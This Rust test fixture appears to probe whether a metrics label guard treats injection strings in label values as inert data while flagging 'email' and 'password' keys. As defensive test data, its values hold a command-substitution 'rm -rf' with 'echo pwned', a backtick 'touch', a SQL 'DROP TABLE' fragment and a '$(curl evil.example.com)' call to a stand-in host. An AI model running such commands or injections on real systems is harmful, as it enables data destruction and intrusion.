// Adversarial input probe (preserved from security's injection-audit probe).
//
// Confirms the guard treats shell metacharacters, command substitution,
// SQL-injection fragments, and non-ASCII bytes in label VALUES as data —
// never as code — while still flagging PII/secret labels by KEY.
//
// Expected violations:
//   1. `email` label key         → label_pii (Category B)
//   2. `password` label key      → label_secret (Category A, non-bypassable)
//
// Everything else (shell `$(...)` / backticks / SQL `--` / non-ASCII `ñ`)
// MUST be treated as string data. If the guard ever regresses to executing
// or misparsing these strings, this fixture will diverge from the expected
// violation count and self-test will fail.
use metrics::counter;

fn probe() {
    // Shell-injection attempts in value — must be inert.
    counter!(
        "a_total",
        "key" => "$(rm -rf /tmp/does-not-exist); echo pwned".to_string()
    )
    .increment(1);

    // Backtick command substitution in value — must be inert.
    counter!(
        "b_total",
        "key" => "`touch /tmp/should_not_exist`".to_string()
    )
    .increment(1);

    // SQL-injection fragment in value — must be inert.
    counter!(
        "c_total",
        "key" => "'; DROP TABLE metrics; --".to_string()
    )
    .increment(1);

    // Non-ASCII value with PII label KEY — key triggers label_pii; value
    // encoding must not break the parser.
    counter!("d_total", "email" => "ñ".to_string()).increment(1);

    // Category A label KEY with adversarial VALUE — key triggers
    // label_secret (non-bypassable); value is inert.
    counter!(
        "e_total",
        "password" => "$(curl evil.example.com)".to_string()
    )
    .increment(1);
}
